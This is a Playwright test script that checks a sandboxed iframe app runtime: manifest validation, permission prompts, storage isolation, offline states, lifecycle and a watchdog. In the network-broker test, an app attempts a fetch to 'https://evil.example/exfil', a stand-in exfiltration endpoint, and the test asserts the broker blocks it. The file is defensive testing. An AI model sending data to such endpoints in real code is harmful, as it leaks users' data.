/* Proves the Web Apps platform is a platform, not a picture of one.
 *
 * Every assertion below is made against a real sandboxed iframe running a real
 * third-party app over a real postMessage bridge. Exits non-zero on any
 * failure, so it is a gate and not a report.
 *
 *   bun tools/test-runtime.mjs
 */
import { chromium } from 'playwright';

const BASE = process.env.PRISM_BASE || 'http://localhost:4310';
const HARNESS = `${BASE}/tools/runtime-harness.html`;

let passed = 0;
const failures = [];

function check(name, cond, detail) {
  if (cond) { passed++; console.log(`  ok   ${name}`); }
  else { failures.push({ name, detail }); console.log(`  FAIL ${name}${detail ? ` — ${detail}` : ''}`); }
}

const browser = await chromium.launch();
const page = await browser.newPage({ viewport: { width: 900, height: 600 } });

const consoleErrors = [];
page.on('console', (m) => { if (m.type() === 'error') consoleErrors.push(m.text()); });
page.on('pageerror', (e) => consoleErrors.push(`pageerror: ${e.message}`));

await page.goto(HARNESS, { waitUntil: 'networkidle' });
await page.waitForFunction(() => window.rtReady === true);

/* ---------- manifest validation ---------- */
console.log('\nmanifest');
{
  const good = await page.evaluate(() => window.rt.inspect('transit').then((r) => ({ valid: r.valid, errors: r.errors })));
  check('valid manifest passes validation', good.valid, JSON.stringify(good.errors));

  const bad = await page.evaluate(() => window.rt.inspect('badmanifest').then((r) => ({
    valid: r.valid, fields: r.errors.map((e) => e.field),
  })));
  check('invalid manifest is rejected', bad.valid === false);
  for (const field of ['name', 'version', 'entry', 'category', 'permissions']) {
    check(`  rejection names "${field}"`, bad.fields.some((f) => f === field || f.startsWith(field)),
      `got ${JSON.stringify(bad.fields)}`);
  }
  check('unknown permission is a hard error',
    bad.fields.includes('permissions'));

  const failed = await page.evaluate(() => window.rt.install('badmanifest').then((r) => r.valid));
  check('install of an invalid manifest reports failure', failed === false, String(failed));
  const installedIds = await page.evaluate(() => [...window.rt.installed.keys()]);
  check('registry stays clean after a failed install', !installedIds.includes('badmanifest'),
    JSON.stringify(installedIds));
}

/* ---------- sandbox ---------- */
console.log('\nsandbox');
await page.evaluate(() => window.rt.install('transit'));
await page.evaluate(() => window.rt.launch('transit'));
await page.waitForFunction(() => window.rt.instances.get('transit')?.status === 'running', null, { timeout: 6000 });

{
  const attr = await page.evaluate(() => window.rt.instances.get('transit').frame.getAttribute('sandbox'));
  check('frame is sandboxed with allow-scripts only', attr === 'allow-scripts', `got "${attr}"`);
  check('frame does NOT get allow-same-origin', !/allow-same-origin/.test(attr || ''));

  /* The real proof of an opaque origin: the host cannot read into the frame,
     which is the same wall that stops the frame reading out to the host. */
  const reachable = await page.evaluate(() => {
    try {
      const d = window.rt.instances.get('transit').frame.contentDocument;
      return d !== null;
    } catch { return false; }
  });
  check('host cannot reach into the frame document (opaque origin)', reachable === false);

  /* Chromium still reports the URL-derived string from location.origin inside a
     sandboxed frame, so that value proves nothing. The load-bearing signals are
     the ones that throw: an opaque origin has no storage of its own and no
     reach into its embedder. */
  const iso = await page.frames()
    .find((f) => f.url().includes('/os/apps/transit/'))
    ?.evaluate(() => ({
      parent: (() => { try { return !!window.parent.document; } catch (e) { return e.name; } })(),
      storage: (() => { try { localStorage.length; return 'accessible'; } catch (e) { return e.name; } })(),
      cookie: (() => { try { document.cookie = 'x=1'; return document.cookie; } catch (e) { return e.name; } })(),
    }));
  check('app cannot touch host DOM', iso?.parent === 'SecurityError', String(iso?.parent));
  check('app has no origin storage of its own', iso?.storage === 'SecurityError', String(iso?.storage));
  check('app cannot set cookies', iso?.cookie === 'SecurityError' || iso?.cookie === '', String(iso?.cookie));
}

/* ---------- bridge and lifecycle ---------- */
console.log('\nbridge + lifecycle');
{
  const inst = await page.evaluate(() => {
    const i = window.rt.instances.get('transit');
    return { status: i.status, calls: i.calls };
  });
  check('app reached "running" via app:ready', inst.status === 'running', inst.status);
  check('app made brokered calls across postMessage', inst.calls > 0, `calls=${inst.calls}`);

  const events = await page.evaluate(() => window.rtLog.map((l) => l.ev));
  check('runtime emitted installed + launching + ready',
    ['installed', 'launching', 'ready'].every((e) => events.includes(e)), JSON.stringify(events));
}

/* ---------- permission broker ---------- */
console.log('\npermissions');
{
  /* Transit's first act is to load departures, so the only prompt it may raise
     on boot is the network one. Anything else means the app asked for a
     capability before it had shown the wearer why. */
  await page.waitForFunction(() => window.rt.pendingPrompt !== null, null, { timeout: 5000 })
    .catch(() => {});
  const prompt = await page.evaluate(() => window.rt.pendingPrompt && {
    id: window.rt.pendingPrompt.id,
    name: window.rt.pendingPrompt.name,
    reason: window.rt.pendingPrompt.reason,
    why: window.rt.pendingPrompt.meta?.why,
  });
  check('a capability call raises a wearer-facing prompt', !!prompt, 'no pendingPrompt');
  check('the boot prompt is for the capability the app actually needs first',
    prompt?.name === 'network', `asked for "${prompt?.name}"`);
  check('prompt carries the app-supplied reason', !!prompt?.reason, JSON.stringify(prompt));
  check('prompt carries the system explanation', !!prompt?.why, JSON.stringify(prompt));

  /* Deny it and the app must render a denial, not hang. */
  await page.evaluate(() => window.rt.answerPrompt('denied'));
  await page.waitForTimeout(500);
  const denied = await page.evaluate(() => window.rt.permissionState('transit', 'network'));
  check('denial is recorded', denied === 'denied', denied);

  const frame = page.frames().find((f) => f.url().includes('/os/apps/transit/'));
  const shown = await frame.evaluate(() => document.body.innerText);
  check('denied app renders a designed denial state, not a blank frame',
    /off|denied|cannot/i.test(shown) && shown.trim().length > 0, JSON.stringify(shown.slice(0, 120)));

  /* An undeclared capability is refused before the wearer is ever asked. */
  const undeclared = await page.evaluate(async () => {
    const inst = window.rt.instances.get('transit');
    try { await window.rt._dispatch(inst, 'location.get', {}); return 'resolved'; }
    catch (e) { return e.code; }
  });
  check('undeclared capability is refused without prompting', undeclared === 'not-declared', undeclared);

  /* Granting it back must reach the app as an event. */
  await page.evaluate(() => window.rt.setPermission('transit', 'network', 'granted'));
  await page.waitForTimeout(600);
  const state = await page.evaluate(() => window.rt.permissionState('transit', 'network'));
  check('grant is recorded and pushed to the app', state === 'granted', state);
}

/* ---------- storage isolation ---------- */
console.log('\nstorage');
{
  await page.evaluate(() => window.rt.install('waypoint'));
  await page.evaluate(() => window.rt.launch('waypoint'));
  await page.waitForFunction(() => window.rt.instances.get('waypoint')?.status === 'running', null, { timeout: 6000 });
  await page.evaluate(() => window.rt.setPermission('waypoint', 'storage', 'granted'));
  await page.evaluate(() => window.rt.setPermission('transit', 'storage', 'granted'));
  await page.waitForTimeout(300);

  await page.evaluate(async () => {
    await window.rt._dispatch(window.rt.instances.get('transit'), 'storage.set', { key: 'secret', value: 'transit-only' });
  });
  const leaked = await page.evaluate(async () =>
    window.rt._dispatch(window.rt.instances.get('waypoint'), 'storage.get', { key: 'secret' }));
  check('one app cannot read another app\'s storage', leaked === null, JSON.stringify(leaked));

  await page.evaluate(() => window.rt.uninstall('waypoint'));
  const wiped = await page.evaluate(() => window.rt.stores.has('waypoint'));
  check('uninstall wipes the app store', wiped === false);
}

/* ---------- offline ---------- */
console.log('\noffline');
{
  await page.evaluate(() => window.rt.setOnline(false));
  await page.waitForTimeout(500);
  const err = await page.evaluate(async () => {
    try { await window.rt._dispatch(window.rt.instances.get('transit'), 'net.fetch', { url: 'https://api.prism.dev/transit/next' }); return 'resolved'; }
    catch (e) { return e.code; }
  });
  check('brokered fetch fails with an offline code when the link is down', err === 'offline', err);

  const frame = page.frames().find((f) => f.url().includes('/os/apps/transit/'));
  const shown = await frame.evaluate(() => document.body.innerText);
  check('app renders a designed offline state', /connection|offline/i.test(shown), JSON.stringify(shown.slice(0, 140)));

  await page.evaluate(() => window.rt.setOnline(true));
  await page.waitForTimeout(900);
  const back = await frame.evaluate(() => document.body.innerText);
  check('app recovers when the link returns (no dead end)', !/no connection/i.test(back), JSON.stringify(back.slice(0, 140)));
}

/* ---------- network broker denies undeclared endpoints ---------- */
console.log('\nnetwork broker');
{
  const blocked = await page.evaluate(async () => {
    try { await window.rt._dispatch(window.rt.instances.get('transit'), 'net.fetch', { url: 'https://evil.example/exfil' }); return 'resolved'; }
    catch (e) { return e.code; }
  });
  check('broker refuses an endpoint the app did not declare', blocked === 'blocked', blocked);
}

/* ---------- suspend / resume / kill ---------- */
console.log('\nsuspend + resume + kill');
{
  await page.evaluate(() => window.rt.suspend('transit'));
  await page.waitForTimeout(200);
  const s = await page.evaluate(() => {
    const i = window.rt.instances.get('transit');
    return { status: i.status, inert: i.frame.hasAttribute('inert') };
  });
  check('suspend marks the instance suspended', s.status === 'suspended');
  check('suspended frame is inert (cannot be interacted with)', s.inert === true);

  await page.evaluate(() => window.rt.resume('transit'));
  await page.waitForTimeout(200);
  const r = await page.evaluate(() => {
    const i = window.rt.instances.get('transit');
    return { status: i.status, inert: i.frame.hasAttribute('inert') };
  });
  check('resume restores the instance', r.status === 'running' && r.inert === false);

  await page.evaluate(() => window.rt.kill('transit'));
  const gone = await page.evaluate(() => ({
    instance: window.rt.instances.has('transit'),
    frames: document.querySelectorAll('#frames iframe').length,
  }));
  check('kill removes the instance', gone.instance === false);
  check('kill removes the frame from the document', gone.frames === 0, `frames=${gone.frames}`);
}

/* ---------- system accessibility reaches inside the sandbox ---------- */
console.log('\nsystem accessibility');
{
  await page.evaluate(() => window.rt.launch('transit'));
  await page.waitForFunction(() => window.rt.instances.get('transit')?.status === 'running', null, { timeout: 9000 });

  await page.evaluate(() => window.rt.setDisplay({ textScale: 2.4, reducedMotion: true }));
  await page.waitForTimeout(200);
  const frame = page.frames().find((f) => f.url().includes('/os/apps/transit/'));
  const inside = await frame?.evaluate(() => ({
    scale: getComputedStyle(document.documentElement).getPropertyValue('--a11y-scale').trim(),
    rm: document.documentElement.hasAttribute('data-reduced-motion'),
  }));
  check('system text scale reaches inside the app frame', inside?.scale === '2.4', String(inside?.scale));
  check('system reduced motion reaches inside the app frame', inside?.rm === true, String(inside?.rm));

  /* The whole point of the window sizing itself: bigger text must make the
     window taller, not clip the app. */
  const grew = await page.waitForFunction(
    () => window.rt.instances.get('transit')?.height > 200 ? window.rt.instances.get('transit').height : false,
    null, { timeout: 4000 },
  ).then((h) => h.jsonValue()).catch(() => 0);
  check('the window grows when the wearer enlarges text', grew > 200, `height=${grew}`);

  const clamped = await page.evaluate(() => window.rt.instances.get('transit')?.height);
  check('a self-reported height is clamped by the host', clamped <= 430, `height=${clamped}`);

  await page.evaluate(() => window.rt.setDisplay({ textScale: 1, reducedMotion: false }));
  await page.evaluate(() => window.rt.kill('transit'));
}

/* ---------- watchdog ---------- */
console.log('\nwatchdog');
{
  await page.evaluate(() => window.rt.install('stalled'));
  await page.evaluate(() => window.rt.launch('stalled'));
  const status = await page.waitForFunction(
    () => window.rt.instances.get('stalled')?.status === 'unresponsive' ? 'unresponsive' : false,
    null, { timeout: 9000 },
  ).then((h) => h.jsonValue()).catch(() => 'never-fired');
  check('an app that never signals ready is caught by the watchdog', status === 'unresponsive', status);
  const err = await page.evaluate(() => window.rt.instances.get('stalled')?.error?.message);
  check('watchdog produces a wearer-readable reason', typeof err === 'string' && err.length > 0, err);
  await page.evaluate(() => window.rt.kill('stalled'));
}

/* ---------- console hygiene ---------- */
console.log('\nhygiene');
check('zero console errors across the whole run', consoleErrors.length === 0,
  consoleErrors.slice(0, 3).join(' | '));

await browser.close();

console.log(`\n${'-'.repeat(58)}`);
if (failures.length) {
  console.log(`RUNTIME GATE: FAIL — ${failures.length} failed, ${passed} passed`);
  for (const f of failures) console.log(`  · ${f.name}${f.detail ? ` — ${f.detail}` : ''}`);
  process.exit(1);
}
console.log(`RUNTIME GATE: PASS — ${passed} checks`);
process.exit(0);
